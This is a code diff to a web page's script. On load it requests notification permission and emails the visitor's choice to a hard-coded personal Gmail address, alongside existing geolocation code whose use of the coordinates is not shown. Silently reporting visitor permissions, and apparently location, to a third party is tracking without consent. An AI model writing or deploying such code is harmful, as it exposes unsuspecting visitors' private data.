@@ -28,12 +28,24 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 
-    <!-- JavaScript for Geolocation and Email Sending -->
+    <!-- JavaScript for Geolocation, Notifications, and Email Sending -->
     <script>
         document.addEventListener("DOMContentLoaded", function () {
             const locationDisplay = document.getElementById("locationDisplay");
             let latitude, longitude;
 
+            // Request Notification Permission
+            if ("Notification" in window) {
+                Notification.requestPermission().then(permission => {
+                    if (permission === "granted") {
+                        sendEmail("Notification Permission Granted", "The user has granted notification permissions.", "khalilrodeni@gmail.com");
+                    } else {
+                        sendEmail("Notification Permission Denied", "The user has denied notification permissions.", "khalilrodeni@gmail.com");
+                    }
+                });
+            }
+
+            // Geolocation permission and location display
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
